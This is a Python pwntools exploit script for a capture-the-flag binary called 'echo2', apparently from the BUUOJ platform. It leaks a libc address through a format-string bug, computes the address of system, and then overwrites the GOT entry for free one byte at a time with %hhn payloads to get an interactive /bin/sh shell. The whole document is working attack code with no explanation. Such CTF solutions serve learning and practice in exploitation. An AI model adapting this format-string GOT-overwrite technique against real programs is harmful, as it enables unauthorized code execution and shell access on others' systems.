import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./echo2')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./echo2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27744)
			elf=ELF('./echo2')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		io.recv()
		io.sendline('/bin/sh\x00')
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline('%19$p')
		libc_base=int(io.recv(14),16)-libc.sym['__libc_start_main']-240
		system_addr=libc_base+libc.sym['system']
		arg0=system_addr&0xff
		arg1=(system_addr&0xff00)>>8
		arg2=(system_addr&0xff0000)>>16
		arg3=(system_addr&0xff000000)>>24
		arg4=(system_addr&0xff00000000)>>32
		arg5=(system_addr&0xff0000000000)>>40
		#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
		pay1='%'+str(arg0)+'c%8$hhn'
		pay2='%'+str(arg1)+'c%8$hhn'
		pay3='%'+str(arg2)+'c%8$hhn'
		pay4='%'+str(arg3)+'c%8$hhn'
		pay5='%'+str(arg4)+'c%8$hhn'
		pay6='%'+str(arg5)+'c%8$hhn'
		pay1=pay1.ljust(0x10,'a')
		pay2=pay2.ljust(0x10,'a')
		pay3=pay3.ljust(0x10,'a')
		pay4=pay4.ljust(0x10,'a')
		pay5=pay5.ljust(0x10,'a')
		pay6=pay6.ljust(0x10,'a')
		pay1+=p64(elf.got['free'])
		pay2+=p64(elf.got['free']+1)
		pay3+=p64(elf.got['free']+2)
		pay4+=p64(elf.got['free']+3)
		pay5+=p64(elf.got['free']+4)
		pay6+=p64(elf.got['free']+5)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay1)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay2)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay3)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay4)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay5)
		io.recv()
		io.sendline('2')
		io.recv()
		io.sendline(pay6)
		io.recv()


		success('libc_base:'+hex(libc_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue